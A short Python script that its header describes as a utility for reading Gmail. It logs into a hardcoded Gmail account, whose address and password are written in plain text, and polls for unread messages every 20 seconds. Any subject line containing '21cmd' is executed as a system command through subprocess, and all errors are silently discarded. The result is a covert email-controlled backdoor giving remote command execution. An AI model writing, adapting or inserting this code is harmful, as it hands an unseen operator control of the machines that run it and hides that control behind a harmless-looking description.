
import smtplib
import time
import imaplib
import email, re, subprocess

# -------------------------------------------------
#
# Utility to read email from Gmail Using Python
#
# ------------------------------------------------
ORG_EMAIL   = "@gmail.com"
FROM_EMAIL  = "remcontrol555" + ORG_EMAIL
FROM_PWD    = "remcontrol5551qaz"
SMTP_SERVER = "imap.gmail.com"
SMTP_PORT   = 993


def read_email_from_gmail():
    try:
        mail = imaplib.IMAP4_SSL(SMTP_SERVER)
        mail.login(FROM_EMAIL,FROM_PWD)
        mail.select('inbox')
        

        type, data = mail.search(None, '(UNSEEN)')
        mail_ids = data[0]
        
        
        id_list = mail_ids.split()   
        first_email_id = int(id_list[0])
        latest_email_id = int(id_list[-1])
        email_subject_list=[]


        for i in range(latest_email_id,first_email_id-1, -1):
            typ, data = mail.fetch(i, '(RFC822)' )

            for response_part in data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_string(response_part[1])
                    #print msg
                    email_subject = msg['subject']
                    email_from = msg['from']
                    #email_text = msg['body']
                    email_subject_list.append(email_subject)
                    #print msg
                    #print 'From : ' + email_from + '\n'
                    #print 'Subject : ' + email_subject + '\n'
                    #print email_text
        return email_subject_list

    except:
        a=1
    #Exception, e:
        #print str(e)
while True:
    time.sleep(20)
    txt=read_email_from_gmail()
    if txt is not None:
        for cmd in txt:
            if '21cmd' in cmd:
                try:
                    cmdCommand = cmd[6:]
                    process = subprocess.Popen(cmdCommand.split(), stdout=subprocess.PIPE)
                except:
                    a=1
            
